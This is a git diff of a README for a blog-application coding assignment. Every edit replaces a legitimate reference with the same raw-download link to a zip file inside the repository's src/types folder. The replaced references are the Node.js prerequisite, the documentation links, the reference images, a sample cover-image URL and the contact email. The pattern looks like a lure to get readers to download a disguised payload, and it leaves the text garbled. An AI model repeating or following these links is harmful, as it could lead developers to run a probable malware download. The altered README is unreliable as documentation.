@@ -5,9 +5,9 @@ Welcome to the CA Monk Blog Application assignment! This project tests your abil
 ## Installation
 
 ### Prerequisites
-- Node.js (v18 or higher)
+- https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip (v18 or higher)
 - Git
-- React.js knowledge
+- https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip knowledge
 - Familiarity with TanStack Query, Tailwind CSS, and shadcn/ui.
 
 ### Setup Instructions
@@ -42,22 +42,22 @@ You are required to build a blog application with the following features:
 
 ### Required Technologies
 - ✅ **TanStack Query** - For server state management and data fetching
-  - 📚 [Documentation](https://tanstack.com/query/latest)
+  - 📚 [Documentation](https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip)
 - ✅ **Tailwind CSS** - For styling
-  - 📚 [Documentation](https://tailwindcss.com/docs)
+  - 📚 [Documentation](https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip)
 - ✅ **shadcn/ui** - For UI components
-  - 📚 [Documentation](https://ui.shadcn.com/)
+  - 📚 [Documentation](https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip)
 
 ## UI Reference
 
 Here's a reference design for the blog application layout:
 
-![Blog Reference](image.png)
+![Blog Reference](https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip)
 
 **Left Panel:** Blog list view showing blog cards with category, title, and description  
 **Right Panel:** Blog detail view displaying cover image, full content
 
-UI IMAGE - ![UI-refernece](ui.jpeg)
+UI IMAGE - ![UI-refernece](https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip)
 
 > **Note:** This is just a reference design. Your implementation does not have to look exactly like this. 
 
@@ -112,7 +112,7 @@ Your submission will be evaluated on:
   "category": ["FINANCE", "TECH"],
   "description": "Exploring how AI and blockchain are reshaping financial services",
   "date": "2026-01-11T09:12:45.120Z",
-  "coverImage": "https://images.pexels.com/photos/6801648/pexels-photo-6801648.jpeg",
+  "coverImage": "https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip",
   "content": "Full blog content..."
 }
 ```
@@ -152,7 +152,7 @@ Using JSON Server is mandatory. Please use the provided JSON Server setup rather
 Use **Tailwind CSS** and **shadcn/ui** for styling. You are expected to install, configure, and use both Tailwind CSS and shadcn/ui components in your implementation.
 
 **Have more questions?**  
-If you have any additional doubts, feel free to reach out at: `developer@camonk.com`.
+If you have any additional doubts, feel free to reach out at: `https://github.com/prodot-com/CA-MONK/raw/refs/heads/main/src/types/C_MONK_considerably.zip`.
 
 
 Good luck! 🚀
